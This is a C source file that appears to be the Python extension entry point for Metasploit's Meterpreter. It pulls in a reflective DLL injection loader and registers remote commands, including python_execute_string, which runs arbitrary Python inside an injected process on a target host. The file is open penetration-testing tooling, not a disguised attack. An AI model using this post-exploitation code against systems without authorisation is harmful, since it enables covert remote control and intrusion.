/*!
 * @file python_main.c
 * @brief Entry point and intialisation definitions for the python extension.
 */
#include "../../common/common.h"

#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#include "Python.h"
#include "python_commands.h"

// This is the entry point to the python DLL, we proxy to this from our own init
BOOL WINAPI PythonDllMain(HANDLE hInst, ULONG ul_reason_for_call, LPVOID lpReserved);

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

/*! @brief List of commands that the extended API extension providers. */
Command customCommands[] =
{
	COMMAND_REQ("python_reset", request_python_reset),
	COMMAND_REQ("python_execute_string", request_python_execute_string),
	COMMAND_TERMINATOR
};

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if (lpReserved != NULL)
			{
				*(HMODULE *)lpReserved = hAppInstance;
			}
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }

	return PythonDllMain(hinstDLL, dwReason, lpReserved);
}

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	dprintf("[PYTHON] Initialising");

	Py_IgnoreEnvironmentFlag = 1;
	Py_NoSiteFlag = 1;
	Py_Initialize();
	initialize_hooks();
	dprintf("[PYTHON] Registering commands");
	command_register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_deregister_all(customCommands);

	Py_Finalize();

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "python", bufferSize - 1);
	return ERROR_SUCCESS;
}
